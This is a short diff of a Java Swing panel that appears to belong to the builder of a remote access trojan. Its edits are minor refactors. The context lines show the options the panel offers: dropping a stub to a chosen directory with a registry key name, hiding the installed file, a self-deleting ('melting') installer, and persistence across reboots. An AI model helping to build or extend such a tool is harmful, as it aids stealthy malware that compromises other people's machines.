@@ -20,8 +20,7 @@ public class PanelBuildStartup extends JPanel {
 	private JTextField txtName;
 	private JComboBox<String> comboBox;
 	private JCheckBox chckbxMeltDropperAfter;
-	private JButton button;
-	private JCheckBox chckbxHideInstalledFile;
+    private JCheckBox chckbxHideInstalledFile;
 	private JCheckBox chckbxRunNextStart;
 	private JCheckBox chckbxDisableInstalling;
 
@@ -70,9 +69,9 @@ public class PanelBuildStartup extends JPanel {
 
 		JLabel lblInstallIn = new JLabel("Install in:");
 
-		comboBox = new JComboBox<String>();
+		comboBox = new JComboBox<>();
 		comboBox.setToolTipText("Drop directory");
-		comboBox.setModel(new DefaultComboBoxModel<String>(DropLocations.STRINGS));
+		comboBox.setModel(new DefaultComboBoxModel<>(DropLocations.STRINGS));
 
 		JLabel lblDroppedFileAnd = new JLabel("File and reg key name:");
 
@@ -84,7 +83,7 @@ public class PanelBuildStartup extends JPanel {
 		chckbxMeltDropperAfter = new JCheckBox("Melt installer after it has been run (Delete itself)");
 		chckbxMeltDropperAfter.setToolTipText("The installer will delete itself when it is executed, disappearing.");
 
-		button = new JButton("");
+        JButton button = new JButton("");
 		button.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				Help.help("Required for installed stub to come back on system reboot");
